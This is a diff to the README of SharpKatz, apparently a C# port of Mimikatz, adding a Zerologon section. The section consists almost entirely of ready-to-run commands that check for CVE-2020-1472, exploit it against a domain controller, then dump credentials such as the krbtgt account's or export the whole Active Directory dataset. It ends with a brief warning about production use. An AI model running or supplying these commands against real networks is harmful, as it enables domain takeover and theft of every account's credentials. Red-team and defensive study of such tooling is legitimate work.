@@ -72,6 +72,28 @@ Dump user credential by GUID <br>
 Export the entire dataset from AD to a file created in the current user's temp forder<br>
 <br>
 
+### Zerologon
+
+No reference to logoncli.dll, using the direct rpc call works even from a [non-domain joined workstation](https://twitter.com/gentilkiwi/status/1306178689630076929)
+
+```SharpKatz.exe --Command zerologon --Mode check --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$```<br>
+Perform Zerologon check <br>
+<br>
+```SharpKatz.exe --Command zerologon --Mode exploit --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$```<br>
+Perform Zerologon attack <br>
+<br>
+```SharpKatz.exe --Command zerologon --Mode auto --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$ --Domain testlab2.local --User krbtgt --DomainController WIN-NSE5CPCP07C.testlab2.local```<br>
+Perform Zerologon attack and dump user credential by username <br>
+<br>
+```SharpKatz.exe --Command zerologon --Mode auto --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$ --Domain testlab2.local --Guid guid --DomainController WIN-NSE5CPCP07C.testlab2.local```<br>
+Perform Zerologon attack and ump user credential by GUID <br>
+<br>
+```SharpKatz.exe --Command zerologon --Mode auto --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$ --Domain testlab2.local --DomainController WIN-NSE5CPCP07C.testlab2.local```<br>
+Perform Zerologon attack and export the entire dataset from AD to a file created in the current user's temp forder<br>
+<br>
+Note: Do not use zerologon in a production environment or at least plan for recovery actions which are detailed [here](https://github.com/dirkjanm/CVE-2020-1472) 
+
+
 ## Credits
 
 This project depends entirely on the work of [Benjamin Delpy](https://twitter.com/gentilkiwi) and [Vincent Le Toux](https://twitter.com/mysmartlogon) on [Mimikatz](https://github.com/gentilkiwi/mimikatz) and [MakeMeEnterpriseAdmin](https://raw.githubusercontent.com/vletoux/MakeMeEnterpriseAdmin/master/MakeMeEnterpriseAdmin.ps1) projects.<br>
